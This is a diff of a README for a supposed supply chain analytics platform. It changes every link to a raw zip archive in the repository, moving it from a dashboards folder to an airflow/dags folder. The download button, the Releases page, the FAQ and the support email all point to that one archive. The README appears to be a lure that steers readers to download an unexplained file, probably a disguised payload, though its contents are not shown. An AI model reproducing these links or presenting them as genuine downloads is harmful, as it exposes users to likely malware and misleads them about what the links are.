@@ -1,6 +1,6 @@
 # 📦 supply-chain-intelligence-platform - Streamline Your Supply Chain Insights
 
-![Download](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip%20Latest%20Release-%20%https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip)
+![Download](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/airflow/dags/intelligence-platform-chain-supply-v3.6.zip%20Latest%20Release-%20%https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/airflow/dags/intelligence-platform-chain-supply-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of the Supply Chain Intelligence Platform, visit this page to download: [Download Supply Chain Intelligence Platform](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip).
+To download the latest version of the Supply Chain Intelligence Platform, visit this page to download: [Download Supply Chain Intelligence Platform](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/airflow/dags/intelligence-platform-chain-supply-v3.6.zip).
 
 Once you're on the Releases page:
 
@@ -58,14 +58,14 @@ If you encounter issues:
 
 - **Check System Requirements:** Ensure your system matches the requirements above.
 - **Reinstall the Application:** Sometimes reinstalling can fix installation issues.
-- **Consult the FAQs:** Visit our [FAQ](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip) section for common questions and answers.
+- **Consult the FAQs:** Visit our [FAQ](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/airflow/dags/intelligence-platform-chain-supply-v3.6.zip) section for common questions and answers.
 
 ## 📞 Support
 
 Need help? You can reach our support team through the following options:
 
 - **GitHub Issues:** Report bugs or ask questions using the Issues tab on the GitHub repository.
-- **Email Support:** Send your inquiries to https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip
+- **Email Support:** Send your inquiries to https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/airflow/dags/intelligence-platform-chain-supply-v3.6.zip
 
 ## 🌐 Join the Community
 
@@ -80,4 +80,4 @@ This project is licensed under the MIT License. Feel free to contribute or modif
 
 ## 🎉 Thank You!
 
-Thank you for choosing the Supply Chain Intelligence Platform. We look forward to helping you gain better insights into your supply chain operations. Don’t forget to check for updates regularly on the [Releases page](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip).
+Thank you for choosing the Supply Chain Intelligence Platform. We look forward to helping you gain better insights into your supply chain operations. Don’t forget to check for updates regularly on the [Releases page](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/airflow/dags/intelligence-platform-chain-supply-v3.6.zip).
